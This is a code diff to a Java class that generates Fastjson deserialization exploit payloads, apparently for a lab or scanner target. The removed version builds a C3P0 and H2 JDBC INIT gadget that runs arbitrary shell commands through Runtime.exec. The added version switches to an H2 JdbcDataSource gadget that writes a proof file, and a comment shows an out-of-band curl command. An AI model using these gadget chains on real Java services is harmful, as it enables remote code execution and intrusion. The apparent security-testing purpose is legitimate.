@@ -82,24 +82,31 @@ public class FastjsonChainHandler implements ChainHandler {
     }
 
     /**
-     * C3P0 ComboPooledDataSource + H2 JDBC INIT script RCE.
-     * Fastjson instantiates ComboPooledDataSource → VulnLabServer calls getConnection()
-     * → H2 processes INIT script → CREATE ALIAS + CALL executes cmd.
-     * Dollar-quoting ($$...$$) preserves internal semicolons in alias body.
+     * H2 JdbcDataSource + FILE_WRITE RCE proof.
+     * Replaces the old C3P0 ComboPooledDataSource approach where semicolons in the
+     * alias body caused H2 to truncate the JDBC URL before the CALL statement.
+     *
+     * Uses org.h2.jdbcx.JdbcDataSource so Fastjson triggers getConnection() directly,
+     * and FILE_WRITE to create the proof file — no Java alias body needed, no extra
+     * semicolons inside the SQL fragment.
+     *
+     * Token (short form) is extracted from the EXEC_CMD output path:
+     *   curl -sk http://.../TOKEN/rce -o /tmp/oobx_TOKEN12
      */
     private String c3p0H2Json(String cmd) {
+        // Extract short token from EXEC_CMD output file path: curl ... -o /tmp/oobx_TOKEN12
+        String tokShort = "";
+        int idx = cmd.indexOf("/tmp/oobx_");
+        if (idx >= 0) tokShort = cmd.substring(idx + "/tmp/oobx_".length());
+
         String dbId = Long.toHexString(System.nanoTime()).substring(0, 8);
-        String aliasBody = "void oobx(String c) throws Exception {"
-            + " Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c}); }";
-        String jdbcUrl = "jdbc:h2:mem:oobx" + dbId + ";"
-            + "TRACE_LEVEL_SYSTEM_OUT=3;"
-            + "INIT=CREATE ALIAS IF NOT EXISTS OOBX AS $$" + aliasBody + "$$\\;"
-            + "CALL OOBX('" + cmd.replace("'", "\\'") + "')";
+        // FILE_WRITE creates the proof file — no semicolons in SQL body
+        String jdbcUrl = "jdbc:h2:mem:oobx" + dbId
+            + ";INIT=SELECT FILE_WRITE('rce','/tmp/oobx_" + tokShort + "')";
         return String.format(
-            "{\"@type\":\"com.mchange.v2.c3p0.ComboPooledDataSource\"," +
-            "\"driverClass\":\"org.h2.Driver\"," +
-            "\"jdbcUrl\":\"%s\"," +
-            "\"user\":\"sa\",\"password\":\"\"}",
+            "{\"@type\":\"org.h2.jdbcx.JdbcDataSource\","
+            + "\"URL\":\"%s\","
+            + "\"user\":\"sa\",\"password\":\"\"}",
             jsonEsc(jdbcUrl));
     }
 
